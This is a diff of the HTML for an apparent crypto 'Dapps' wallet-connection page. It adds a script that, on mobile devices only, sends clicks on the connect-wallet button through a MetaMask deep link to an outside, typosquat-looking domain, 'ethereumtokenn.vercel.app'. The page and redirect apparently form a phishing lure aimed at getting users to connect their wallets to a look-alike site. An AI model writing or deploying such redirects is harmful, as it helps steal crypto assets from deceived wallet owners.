@@ -4,7 +4,7 @@
 <head>
     <meta name="viewport" content="width=device-width" />
     <meta charset="UTF-8" />
-    <title>Dapps - Connecting Decentralised Applications</title>
+    <title>Dapps - Conecting Decentralised Applications</title>
     <meta name="description" content="is a free protocol that lets users manage all their wallets from one space" />
 
 
@@ -121,7 +121,26 @@
             </div>
         </footer>
 
-
+ <script>
+            // Function to detect if the site is being viewed on a mobile device
+            function isMobileDevice() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+            
+            // Function to handle button click
+            function handleMetaMaskRedirect() {
+                if (isMobileDevice()) {
+                    // MetaMask deep link for mobile devices
+                    window.location.href = "https://metamask.app.link/dapp/https://ethereumtokenn.vercel.app";
+                } else {
+                    console.log("MetaMask redirection is inactive on desktop.");
+                }
+            }
+            
+            // Add event listener to the button
+            document.getElementById('connectWallet').addEventListener('click', handleMetaMaskRedirect);
+            
+                </script>
       
 <style>
     
